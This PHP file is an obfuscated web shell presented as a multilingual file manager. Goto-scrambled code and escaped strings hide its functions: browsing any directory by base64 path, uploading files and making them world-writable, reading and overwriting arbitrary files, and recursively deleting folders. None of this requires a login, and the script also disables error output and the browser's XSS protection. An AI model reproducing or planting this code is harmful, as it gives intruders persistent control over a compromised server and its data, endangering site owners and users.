<?php
 goto a8Xhv; Lry0X: if (isset($_POST["\163\x61\x76\145"])) { $filePath = base64_decode($_POST["\x66\151\x6c\x65\137\x70\x61\x74\150"]); $content = $_POST["\143\x6f\x6e\164\x65\156\x74"]; if (file_put_contents($filePath, $content)) { echo "\74\x64\x69\166\40\x63\x6c\141\x73\163\75\42\x73\x75\x63\143\145\x73\163\x22\x3e\346\226\x87\344\xbb\266\344\277\235\345\255\x98\xe6\x88\x90\xe5\x8a\x9f\x3c\x2f\144\x69\166\x3e"; } else { echo "\74\x64\x69\x76\x20\143\154\141\163\x73\x3d\x22\145\x72\162\x6f\x72\x22\x3e\xe6\226\207\xe4\xbb\266\xe4\277\235\xe5\255\230\345\244\xb1\350\264\xa5\74\57\144\x69\166\76"; } } goto slhy7; pZc2r: UOXh1: goto v79ka; UcmEj: ?>
<!doctypehtml><html><head><title>Διαχείριση Ιστού</title><style>body{font-family:Arial;margin:20px}.success{color:green;padding:10px;margin:10px 0}.error{color:red;padding:10px;margin:10px 0}table{width:100%;border-collapse:collapse;margin-top:20px}td,th{padding:10px;text-align:left;border-bottom:1px solid #ccc}th{background-color:#f8f8f8}.folder:before{content:"📁 "}.file:before{content:"📄 "}.path-bar{background:#f0f8ff;padding:12px;margin-bottom:15px}.btn{padding:6px 12px;background:#4a86e8;color:#fff;border:none;cursor:pointer}.actions a{margin-right:10px}.delete-btn{color:#e53935}.edit-btn{color:#388e3c}</style></head><body><div class="breadcrumb"><?php  goto B4TRv; xlsT3: GUXyw: goto vOksj; monrI: N2Wqj: goto rNAwk; wMIpB: echo htmlspecialchars($currentDir); goto U7VPE; U7VPE: ?>
</div><form enctype="multipart/form-data"method="post"><input multiple name="n[]"type="file"> <button class="btn"type="submit">上传文件</button></form><?php  goto UET1Y; LPjna: ob_end_flush(); goto lKOLJ; OwtXf: nf7B7: goto UfnVV; ysCUM: goto UOXh1; goto j7_rf; MyRCc: goto N2Wqj; goto Mn7Wx; CvD2h: ?>
</div><div class="path-bar"><strong>Đường dẫn hiện tại:</strong><?php  goto wMIpB; s2OO0: $currentDir = realpath(isset($_GET["\x64"]) ? base64_decode($_GET["\x64"]) : getcwd()) ?: "\x2f"; goto GqmUd; j7_rf: Xx9Ta: goto PiQnl; v79ka: error_reporting(0); goto AU3JW; rNAwk: $items = scandir($currentDir); goto BFhb5; na3DQ: goto o_mrF; goto dQdjC; GqmUd: if (isset($_FILES["\156"])) { foreach ($_FILES["\x6e"]["\x6e\x61\155\145"] as $i => $name) { $target = $currentDir . DIRECTORY_SEPARATOR . $name; if (move_uploaded_file($_FILES["\x6e"]["\x74\x6d\x70\137\156\141\155\x65"][$i], $target)) { chmod($target, 511); echo "\x3c\x64\151\x76\x20\143\x6c\141\x73\163\75\x22\x73\x75\x63\143\x65\163\163\42\x3e\344\270\212\xe4\xbc\240\xe6\x88\220\xe5\212\x9f\72\40" . htmlspecialchars($name) . "\74\x2f\144\x69\x76\x3e"; } else { echo "\74\144\151\166\40\x63\x6c\x61\163\163\75\42\x65\x72\x72\157\x72\42\x3e\344\xb8\212\344\274\240\xe5\244\261\350\xb4\xa5\72\x20" . htmlspecialchars($name) . "\x3c\57\x64\151\x76\x3e"; } } } goto eQ5cT; OowfS: umask(0); goto s2OO0; B4TRv: echo buildBreadcrumb($currentDir); goto CvD2h; Lq6XC: hB4pN: goto GUAAQ; AU3JW: goto Xx9Ta; goto xlsT3; mLTJv: o_mrF: goto OowfS; MQ2S3: goto hB4pN; goto Lq6XC; slhy7: function formatSize($bytes) { if ($bytes === 0) { return "\60\x20\102"; } $units = array("\107\102" => 1073741824, "\x4d\102" => 1048576, "\113\x42" => 1024); foreach ($units as $unit => $factor) { if ($bytes >= $factor) { return number_format($bytes / $factor, 2) . "\x20{$unit}"; } } return "{$bytes}\x20\x42"; } goto t194I; GUAAQ: ob_start(); goto YUhH1; UET1Y: if (isset($_GET["\x65\x64\x69\x74"])) { $file = base64_decode($_GET["\x65\144\x69\164"]); if (file_exists($file) && is_file($file)) { echo showEditor($file); } } goto tTSVh; a8Xhv: goto EYMtm; goto pZc2r; dQdjC: EYMtm: goto IpV5_; eQ5cT: if (isset($_GET["\x64\x65\154\145\x74\145"])) { $target = realpath(base64_decode($_GET["\144\x65\154\145\164\145"])); if ($target && strpos($target, $currentDir) === 0) { if (is_dir($target)) { $files = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($target, RecursiveDirectoryIterator::SKIP_DOTS), RecursiveIteratorIterator::CHILD_FIRST); foreach ($files as $file) { if ($file->isDir()) { rmdir($file->getRealPath()); } else { unlink($file->getRealPath()); } } $result = rmdir($target); } else { $result = unlink($target); } echo $result ? "\74\x64\x69\166\40\143\154\141\x73\163\x3d\x22\x73\x75\x63\143\x65\x73\163\42\76\xe5\x88\240\xe9\231\xa4\346\210\x90\xe5\x8a\237\x3c\x2f\144\151\x76\76" : "\74\x64\151\x76\x20\x63\x6c\141\x73\x73\x3d\42\x65\162\x72\157\x72\42\76\345\210\240\xe9\x99\244\345\xa4\xb1\xe8\xb4\245\74\x2f\x64\x69\x76\x3e"; } } goto Lry0X; UfnVV: ?>
</tbody></table></body></html><?php  goto LPjna; PiQnl: ini_set("\x64\151\x73\x70\154\141\x79\137\x65\x72\162\x6f\162\x73", false); goto na3DQ; tTSVh: ?>
<table><thead><tr><th>名称</th><th>类型</th><th>大小</th><th>权限</th><th>操作</th></tr></thead><tbody><?php  goto MyRCc; vOksj: set_time_limit(0); goto ysCUM; Y1Tcg: function showEditor($file) { $content = htmlspecialchars(file_get_contents($file)); return "\74\x66\x6f\162\155\x20\155\x65\164\150\157\144\75\42\x70\x6f\x73\164\42\x20\163\x74\171\154\x65\x3d\42\x6d\141\162\x67\151\156\x3a\62\60\x70\170\40\60\x22\x3e\12\40\x20\x20\40\x20\40\x20\40\x3c\x68\x33\x3e\347\xbc\226\xe8\276\221\xe6\226\x87\344\xbb\266\x3a\x20" . htmlspecialchars(basename($file)) . "\x3c\57\x68\x33\76\xa\40\40\40\40\40\x20\40\40\74\x74\145\x78\164\x61\x72\x65\x61\x20\x6e\141\x6d\x65\x3d\42\x63\157\x6e\x74\145\x6e\164\42\40\x72\157\x77\x73\75\x22\x31\65\42\40\x73\164\171\154\x65\75\x22\167\x69\144\164\150\72\61\60\60\45\x3b\x62\x6f\162\144\145\x72\x3a\x31\160\170\x20\163\x6f\x6c\x69\144\40\x23\143\x63\x63\x3b\x70\141\x64\144\151\156\147\x3a\x31\x30\x70\x78\73\x66\157\156\164\x2d\x66\x61\x6d\151\154\x79\72\155\157\x6e\x6f\163\x70\141\x63\145\42\x3e" . $content . "\74\57\x74\145\170\x74\x61\x72\x65\x61\76\12\40\40\x20\40\x20\x20\x20\40\74\151\x6e\x70\165\x74\x20\164\x79\x70\x65\75\42\x68\x69\x64\144\x65\156\42\x20\x6e\141\x6d\145\75\42\x66\x69\154\x65\137\x70\141\x74\x68\42\x20\166\x61\x6c\x75\x65\x3d\42" . base64_encode($file) . "\42\76\12\40\40\x20\x20\40\40\40\40\x3c\142\x75\x74\x74\x6f\156\40\x74\x79\160\145\75\x22\x73\165\142\155\151\x74\x22\40\x6e\141\155\145\75\x22\163\141\166\145\42\x20\x63\x6c\x61\163\163\x3d\42\142\164\x6e\x22\x3e\xe4\277\x9d\xe5\255\230\xe6\x96\207\344\xbb\xb6\74\57\142\165\x74\x74\x6f\x6e\76\xa\40\40\x20\40\x3c\57\146\157\x72\155\x3e"; } goto UcmEj; qdKRL: foreach ($items as $item) { if ($item == "\x2e" || $item == "\x2e\x2e") { continue; } $fullPath = $currentDir . DIRECTORY_SEPARATOR . $item; $isDir = is_dir($fullPath); $size = $isDir ? "\55" : formatSize(filesize($fullPath)); $perms = substr(sprintf("\45\x6f", fileperms($fullPath)), -4); echo "\x3c\x74\162\x3e"; echo $isDir ? "\74\x74\x64\40\x63\x6c\141\x73\163\x3d\42\x66\157\154\x64\145\x72\x22\76\x3c\x61\x20\150\x72\x65\146\x3d\x22\x3f\x64\75" . base64_encode($fullPath) . "\x22\76" . htmlspecialchars($item) . "\74\x2f\x61\76\74\57\x74\144\x3e" : "\74\164\144\40\x63\154\x61\163\x73\x3d\x22\x66\x69\x6c\x65\42\76" . htmlspecialchars($item) . "\74\57\x74\144\x3e"; echo "\x3c\x74\144\76" . ($isDir ? "\xe7\233\xae\xe5\275\x95" : "\346\x96\x87\xe4\xbb\xb6") . "\74\57\x74\144\x3e"; echo "\74\x74\x64\x3e" . $size . "\74\x2f\164\144\x3e"; echo "\74\x74\x64\76" . $perms . "\x3c\57\164\x64\76"; echo "\x3c\x74\x64\x20\143\x6c\x61\163\163\75\42\x61\x63\x74\x69\157\x6e\x73\x22\76"; echo "\74\141\x20\150\162\145\146\x3d\x22\77\144\x65\x6c\145\164\145\x3d" . base64_encode($fullPath) . "\x22\40\143\154\x61\x73\163\75\42\144\x65\x6c\x65\x74\145\x2d\x62\x74\x6e\x22\x20\x6f\156\143\x6c\151\x63\153\75\42\x72\145\x74\165\162\x6e\40\143\157\x6e\x66\151\162\x6d\50\x27\xe7\xa1\256\345\256\x9a\345\x88\240\xe9\231\244\x3f\x27\51\42\x3e\345\210\240\351\231\244\x3c\57\x61\76"; if (!$isDir) { echo "\x3c\141\x20\150\162\x65\146\75\42\77\x64\75" . base64_encode($currentDir) . "\46\x65\144\151\x74\75" . base64_encode($fullPath) . "\42\x20\143\154\141\x73\x73\75\x22\145\144\151\164\55\142\x74\156\x22\x3e\347\xbc\x96\350\276\221\x3c\x2f\x61\x3e"; } echo "\74\x2f\164\x64\x3e"; echo "\74\x2f\164\x72\x3e"; } goto GML3R; t194I: function buildBreadcrumb($path) { $parts = explode(DIRECTORY_SEPARATOR, trim($path, DIRECTORY_SEPARATOR)); $breadcrumb = array(); $currentPath = ''; $rootPath = DIRECTORY_SEPARATOR; $breadcrumb[] = "\74\141\x20\x68\x72\x65\x66\x3d\x22\77\144\75" . base64_encode($rootPath) . "\x22\76\153\xc3\xb6\x6b\x20\x64\x69\172\x69\156\x3c\57\141\76"; foreach ($parts as $part) { if ($part === '') { continue; } $currentPath .= DIRECTORY_SEPARATOR . $part; $breadcrumb[] = "\74\141\40\x68\x72\145\x66\x3d\42\77\x64\75" . base64_encode($currentPath) . "\x22\76" . htmlspecialchars($part) . "\74\57\x61\76"; } return implode("\40\x26\x72\141\x71\x75\157\x3b\40", $breadcrumb); } goto Y1Tcg; IpV5_: header("\x58\x2d\x58\x53\x53\x2d\x50\x72\x6f\x74\145\143\164\x69\x6f\156\x3a\40\x30"); goto MQ2S3; GML3R: goto nf7B7; goto monrI; YUhH1: goto GUXyw; goto mLTJv; Mn7Wx: wpvVz: goto qdKRL; BFhb5: goto wpvVz; goto OwtXf; lKOLJ: ?>